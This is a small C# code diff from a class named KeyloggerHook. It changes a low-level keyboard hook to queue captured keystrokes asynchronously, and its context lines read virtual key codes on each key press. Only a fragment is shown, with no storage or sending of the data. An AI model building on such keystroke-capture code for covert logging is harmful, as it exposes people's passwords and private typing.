@@ -50,7 +50,7 @@ public class KeyloggerHook : IKeyLoggerHook
     {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
-            engine.EnqueueKey(lParam);
+            engine.EnqueueKeyAsync(lParam);
 
             int vkCode = Marshal.ReadInt32(lParam);
             string key = ((Keys)vkCode).ToString();
